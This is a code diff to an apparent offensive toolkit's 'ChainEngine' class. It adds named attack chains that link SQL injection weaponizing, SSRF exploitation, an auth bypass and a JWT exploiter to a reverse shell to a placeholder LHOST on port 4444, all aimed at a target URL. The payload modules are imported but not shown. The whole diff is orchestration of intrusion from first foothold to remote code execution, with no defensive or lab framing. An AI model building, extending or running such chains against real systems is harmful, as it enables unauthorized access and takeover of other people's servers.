@@ -2,6 +2,7 @@ from typing import Dict, Optional, List
 import requests
 
 from tools.log_utils import get_logger
+from tools.settings import settings
 
 logger = get_logger("chain_engine")
 
@@ -17,6 +18,7 @@ CHAIN_PATHS = {
 class ChainEngine:
     def __init__(self, sess: Optional[requests.Session] = None, timeout: float = 10.0):
         self.sess = sess or requests.Session()
+        self.sess.verify = settings.verify_ssl
         self.timeout = timeout
         self.results = {}
 
@@ -47,13 +49,13 @@ class ChainEngine:
                        lport: int = 4444) -> Dict:
         results = {}
         from tools import sqli_weaponizer, sqli_blind, sqli_oob
-        from tools import ssrf_lateral, ssrf_pwn, reverse_shell
+        from tools import ssrf_pwn, reverse_shell
         try:
             results["sqli"] = sqli_weaponizer.check(url, param, self.sess, self.timeout)
         except Exception as e:
             logger.debug("weaponize sqli: %s", e)
         try:
-            results["ssrf_lateral"] = ssrf_lateral.run(url, param, self.sess, self.timeout)
+            results["ssrf_lateral"] = ssrf_pwn.run(url, param, self.sess, self.timeout)
         except Exception as e:
             logger.debug("weaponize ssrf_lateral: %s", e)
         try:
@@ -66,11 +68,6 @@ class ChainEngine:
             logger.debug("weaponize reverse_shell: %s", e)
         return results
 
-    def weaponize_ssrf_lateral(self, url: str, param: str,
-                                lhost: str = "LHOST", lport: int = 4444) -> Dict:
-        from tools import ssrf_lateral
-        return ssrf_lateral.run(url, param, self.sess, self.timeout)
-
     def full_chain(self, url: str, param: str, lhost: str = "LHOST",
                     lport: int = 4444) -> Dict:
         result = {"target": "%s?%s=" % (url, param)}
@@ -81,6 +78,25 @@ class ChainEngine:
         return result
 
     def run(self, url: str, param: str, chain: str = "full_chain") -> Dict:
-        if chain in CHAIN_PATHS:
-            return self.full_chain(url, param)
+        if chain == "ssrf_to_pwn":
+            from tools import ssrf_pwn
+            result = {"target": "%s?%s=" % (url, param), "chain": chain}
+            result["ssrf_detect"] = self.detect_all(url, param).get("ssrf")
+            result["ssrf_lateral"] = ssrf_pwn.run(url, param, self.sess, self.timeout)
+            result["ssrf_pwn"] = ssrf_pwn.check(url, param, self.sess, self.timeout)
+            return result
+        if chain == "sqli_to_rce":
+            from tools import sqli_weaponizer, reverse_shell
+            result = {"target": "%s?%s=" % (url, param), "chain": chain}
+            det = self.detect_all(url, param)
+            result["sqli_detect"] = det.get("sqli")
+            result["sqli_weaponizer"] = sqli_weaponizer.check(url, param, self.sess, self.timeout)
+            result["reverse_shell"] = reverse_shell.run("LHOST", 4444)
+            return result
+        if chain == "auth_bypass_to_pwn":
+            from tools import auth_bypass, jwt_exploiter, reverse_shell
+            result = {"target": "%s?%s=" % (url, param), "chain": chain}
+            result["auth_bypass"] = auth_bypass.check(url, self.sess, self.timeout)
+            result["reverse_shell"] = reverse_shell.run("LHOST", 4444)
+            return result
         return self.full_chain(url, param)
